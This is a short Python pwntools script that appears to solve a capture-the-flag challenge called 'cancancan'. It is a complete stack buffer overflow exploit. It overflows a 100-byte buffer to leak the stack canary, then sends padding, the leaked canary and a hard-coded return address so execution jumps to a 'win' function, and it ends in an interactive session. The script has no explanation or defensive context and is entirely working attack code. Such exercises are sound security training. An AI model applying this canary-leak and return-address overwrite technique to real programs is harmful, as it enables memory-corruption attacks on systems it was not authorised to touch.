from pwn import *

win = p32(0x08049236)
offset = "A"*100
p = process("./cancancan")
p.recvuntil("???")
p.sendline(offset)
p.recvuntil(offset)

canary = u32(p.recv(4)) - 0xa
log.info("canary: {} ".format(hex(canary)))

bypass = offset + p32(canary) + "A"*12 + win
p.send(bypass)
p.recv()
p.interactive()

